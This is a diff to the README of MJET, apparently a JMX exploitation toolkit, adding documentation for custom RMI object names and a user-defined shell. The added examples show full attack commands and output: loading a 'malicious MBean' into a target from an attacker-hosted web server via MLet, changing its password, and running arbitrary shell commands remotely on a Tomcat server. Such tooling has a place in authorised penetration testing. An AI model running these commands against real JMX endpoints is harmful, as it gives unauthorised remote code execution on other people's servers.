@@ -35,6 +35,8 @@ Authentication support (if JMX authentication is enabled):
 Other optional arguments:
 * **--jmxmp** - Use JMX-MP (requires to load an additional JAR)
 * **--localhost_bypass** - service port for the proxy in localhost bypass
+* **--shell** - Use defined shell
+* **--rmiObjectName** - RMI name of the JMX endpoint 
 
 ### Modes and modeOptions
 
@@ -359,6 +361,54 @@ MJET - MOGWAI LABS JMX Exploitation Toolkit
 [+] Successfully changed password
 [+] Done
 ``` 
+
+### Custom RMI Object Name
+Sometimes it happens that the RMI object name of the JMX endpoint is not jmxrmi, in this case the parameter --rmiObjectName can be used to specify the appropriate RMI object name, for example --rmiObjectName=customJmxRmi.
+```bash
+$ jython mjet.py --rmiObjectName=customJmxRmi 172.17.0.2 2222 super_secret install http://172.17.0.1:8000 8000
+
+MJET - MOGWAI LABS JMX Exploitation Toolkit
+===========================================
+[+] Starting webserver at port 8000
+[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/customJmxRmi
+[+] Connected: rmi://10.165.188.1  1
+[+] Loaded javax.management.loading.MLet
+[+] Loading malicious MBean from http://10.165.188.1:8000
+[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
+10.165.188.23 - - [26/Apr/2019 21:50:37] "GET / HTTP/1.1" 200 -
+[+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
+[+] Changing default password...
+[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
+[+] Successfully changed password
+[+] Done
+$  
+```
+
+### Using own defined Shell
+Sometimes it happens that the target system does not provide a /bin/bash or cmd.exe shell. In this case the optional parameter --shell can be specified, for example --shell="bash -c". By executing the javascript javaproperties.js with mjet.py, more details about the environment are given. 
+```
+$ jython mjet.py --shell="bash -c" 10.165.188.23 2222 command super_secret "ls -la"
+
+MJET - MOGWAI LABS JMX Exploitation Toolkit
+===========================================
+[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
+[+] Connected: rmi://10.165.188.1  4
+[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
+[+] Executing command: ls -la
+total 20
+drwxr-xr-x  5 root    root    4096 Apr 26 11:12 .
+drwxr-xr-x 33 root    root    4096 Apr 10 13:54 ..
+lrwxrwxrwx  1 root    root      12 Aug 13  2018 conf -> /etc/tomcat8
+drwxr-xr-x  2 tomcat8 tomcat8 4096 Aug 13  2018 lib
+lrwxrwxrwx  1 root    root      17 Aug 13  2018 logs -> ../../log/tomcat8
+drwxr-xr-x  2 root    root    4096 Apr 26 11:12 policy
+drwxrwxr-x  3 tomcat8 tomcat8 4096 Apr 10 13:54 webapps
+lrwxrwxrwx  1 root    root      19 Aug 13  2018 work -> ../../cache/tomcat8
+
+
+[+] Done
+$
+```
 
 Reference: https://www.optiv.com/blog/exploiting-jmx-rmi
 
